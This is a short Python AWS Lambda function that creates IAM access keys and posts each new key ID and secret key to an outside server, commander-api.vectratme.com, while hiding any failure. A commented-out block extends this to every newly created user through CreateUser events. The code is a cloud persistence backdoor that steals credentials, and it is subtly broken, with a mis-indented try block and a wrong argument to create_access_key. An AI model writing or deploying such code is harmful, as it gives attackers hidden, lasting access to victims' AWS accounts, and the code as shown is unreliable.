import boto3
from botocore.vendored import requests
def lambda_handler(event,context):
    client=boto3.client('iam')
        try:
            response=client.create_access_key('bxp')
            requests.post('https://commander-api.vectratme.com/adduser',data={"AKId":response['AccessKey']['AccessKeyId'],"SAK":response['AccessKey']['SecretAccessKey']})
        except:
            pass
        
    #if event['detail']['eventName']=='CreateUser':
        #client=boto3.client('iam')
        #try:
            #response=client.create_access_key(UserName=event['detail']['requestParameters']['userName'])
            #requests.post('https://commander-api.vectratme.com/adduser',data={"AKId":response['AccessKey']['AccessKeyId'],"SAK":response['AccessKey']['SecretAccessKey']})
        #except:
            #pass
    return